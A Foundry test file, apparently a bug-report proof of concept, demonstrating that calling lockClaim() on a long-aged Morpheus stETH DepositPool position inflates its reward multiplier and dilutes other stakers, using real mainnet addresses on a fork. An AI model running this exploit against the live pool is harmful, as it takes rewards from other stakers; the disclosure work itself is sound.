// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IStETH {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function submit(address referral_) external payable returns (uint256);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function lockClaim(uint256 rewardPoolIndex_, uint128 claimLockEnd_) external;
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function getCurrentUserMultiplier(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
}

/// @title Morpheus DepositPool: retroactive lock multiplier via lockClaim()
/// @notice On a pinned mainnet fork, the owner of a real, long-untouched stETH
///         position (claimLockStart 626 days old, never claimed, not locked)
///         calls lockClaim() committing to only 30 further days of lock. The
///         pool prices the multiplier over the position's whole age instead of
///         the 30 days actually committed: the position's multiplier goes from
///         1.01x to 3.7154x (virtual stake 4.0399 to 14.8612 stETH on 3.9999
///         stETH deposited), while an honest staker who locks the same
///         capital for the same 30 days from today stays at exactly 1.0x. The
///         excess weight is paid by every other staker through dilution of
///         the pool's fixed reward stream.
///
///         No privileged account is used: the impersonated address is an
///         ordinary staker acting on its own position (the threat model of
///         this bug — any staker can do this). The control staker is a fresh
///         test account funded through Lido's public submit() function.
///         No time travel and no mocked contracts are involved.
contract LockClaimRetroRealTest is Test {
    uint256 constant FORK_BLOCK = 26314439; // 2026-10-31
    address constant POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790; // stETH DepositPool (Appendix A)
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A; // Distributor (Appendix A)
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    // Real position on the stETH pool: staked ~627 days before the fork
    // block, never claimed, never locked (claimLockEnd in the past).
    address constant AGED = 0x357B2b095461A6f25F2D3E709b2a8830b71C0e1b;

    uint256 constant PRECISION = 1e25;

    IDepositPool pool = IDepositPool(POOL);
    IStETH steth = IStETH(STETH);
    address honest = makeAddr("honestLocker");

    function setUp() public {
        // Default RPC is a public endpoint that serves archive state at the
        // pinned block (verified). Override with ETH_RPC_URL if needed.
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://eth.drpc.org")), FORK_BLOCK);
    }

    function test_AgedPositionLockClaimInflatesWeight() public {
        // ---- Preconditions on the real position (asserted, not assumed) ----
        (
            ,
            uint256 depA,
            ,
            ,
            uint128 startA,
            uint128 endA0,
            uint256 virtA0,
            ,
        ) = pool.usersData(AGED, 0);
        require(depA >= 3.9 ether && depA <= 4.1 ether, "unexpected aged deposit size");
        require(startA > 0, "aged position has no lock start");
        require(block.timestamp - startA > 550 days, "position is not old enough");
        require(endA0 <= block.timestamp, "position is still locked");
        uint256 multA0 = pool.getCurrentUserMultiplier(0, AGED);
        console.log("AGED deposited (stETH):", depA);
        console.log("AGED claimLockStart age (days):", (block.timestamp - startA) / 1 days);
        console.log("AGED multiplier before (1e25 = 1x):", multA0);
        console.log("AGED virtual before:", virtA0);
        // The position carries (almost) no lock weight today.
        assertLt(multA0, (PRECISION * 105) / 100, "aged position unexpectedly already weighted");

        (, , uint256 totalVirtualBefore) = pool.rewardPoolsData(0);

        // ---- The whole attack: the owner locks for only 30 more days ----
        uint128 lockEnd = uint128(block.timestamp + 30 days);
        vm.prank(AGED);
        pool.lockClaim(0, lockEnd);

        (, , , , , , uint256 virtA1, , ) = pool.usersData(AGED, 0);
        uint256 multA1 = pool.getCurrentUserMultiplier(0, AGED);
        console.log("AGED multiplier after lockClaim(+30d):", multA1);
        console.log("AGED virtual after:", virtA1);

        // ---- Control: honest staker, same capital, same 30-day lock ----
        vm.deal(honest, 10 ether);
        vm.startPrank(honest);
        steth.submit{value: 5 ether}(address(0));
        steth.approve(POOL, type(uint256).max);
        steth.approve(DIST, type(uint256).max);
        pool.stake(0, 4 ether, lockEnd, address(0));
        vm.stopPrank();

        (, uint256 depB, , , , , uint256 virtB, , ) = pool.usersData(honest, 0);
        uint256 multB = pool.getCurrentUserMultiplier(0, honest);
        console.log("HONEST deposited (stETH):", depB);
        console.log("HONEST multiplier (30d lock from today):", multB);
        console.log("HONEST virtual:", virtB);

        (, , uint256 totalVirtualAfter) = pool.rewardPoolsData(0);
        console.log("Pool totalVirtualDeposited before/after attack:", totalVirtualBefore, totalVirtualAfter);

        // ---- Assertions on the loss (dilution of all other stakers) ----
        // 1. The 30-day lock multiplied the aged position's weight far beyond
        //    what 30 days of lock is worth for anyone else.
        assertGt(multA1, (multA0 * 2), "multiplier did not inflate at least 2x over its prior value");
        // 2. Same capital, same forward lock: the aged position ends up with
        //    at least 1.5x the reward weight of the honest position. The gap
        //    is extracted from the fixed pool reward stream, i.e. from the
        //    other stakers' future rewards.
        assertGt(virtA1, (virtB * 3) / 2, "aged virtual stake not >=1.5x honest for identical terms");
        // 3. No new capital entered the pool from the aged position, yet the
        //    pool's total reward weight grew by exactly the inflated amount.
        assertEq(totalVirtualAfter - totalVirtualBefore, (virtA1 - virtA0) + virtB, "weight accounting mismatch");
    }
}
